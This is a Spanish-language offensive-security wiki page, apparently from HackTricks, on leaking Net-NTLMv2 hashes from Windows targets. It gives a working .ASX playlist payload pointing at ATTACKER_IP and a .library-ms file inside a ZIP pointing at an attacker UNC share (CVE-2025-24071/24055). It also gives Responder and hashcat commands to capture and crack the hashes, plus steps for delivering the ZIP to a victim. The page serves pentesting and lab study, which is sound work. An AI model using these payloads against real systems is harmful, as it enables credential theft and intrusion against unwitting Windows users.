# Lugares para robar credenciales NTLM

{{#include ../../banners/hacktricks-training.md}}

**Consulta todas las grandes ideas de [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) desde la descarga de un archivo Microsoft Word en línea hasta la fuente de NTLM leaks: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md y [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**


### Listas de reproducción de Windows Media Player (.ASX/.WAX)

Si consigues que un objetivo abra o previsualice una lista de reproducción de Windows Media Player que controles, puedes leak Net‑NTLMv2 apuntando la entrada a una ruta UNC. WMP intentará recuperar el medio referenciado a través de SMB y se autenticará implícitamente.

Ejemplo de payload:
```xml
<asx version="3.0">
<title>Leak</title>
<entry>
<title></title>
<ref href="file://ATTACKER_IP\\share\\track.mp3" />
</entry>
</asx>
```
Flujo de recopilación y cracking:
```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
### .library-ms incrustado en ZIP NTLM leak (CVE-2025-24071/24055)

Windows Explorer maneja de forma insegura los archivos .library-ms cuando se abren directamente desde dentro de un archivo ZIP. Si la definición de la biblioteca apunta a una ruta UNC remota (p. ej., \\attacker\share), simplemente explorar/ejecutar el .library-ms dentro del ZIP hace que Explorer enumere la UNC y emita autenticación NTLM al atacante. Esto produce un NetNTLMv2 que puede romperse offline o potencialmente relayearse.

Ejemplo mínimo de .library-ms que apunta a un UNC del atacante
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<version>6</version>
<name>Company Documents</name>
<isLibraryPinned>false</isLibraryPinned>
<iconReference>shell32.dll,-235</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation>
<url>\\10.10.14.2\share</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
Pasos operativos
- Crea el archivo .library-ms con el XML anterior (configura tu IP/hostname).
- Comprime el archivo (en Windows: Send to → Compressed (zipped) folder) y entrega el ZIP al objetivo.
- Inicia un NTLM capture listener y espera a que la víctima abra el .library-ms desde dentro del ZIP.


## Referencias
- [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 to DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Morphisec – 5 NTLM vulnerabilities: Unpatched privilege escalation threats in Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)


{{#include ../../banners/hacktricks-training.md}}
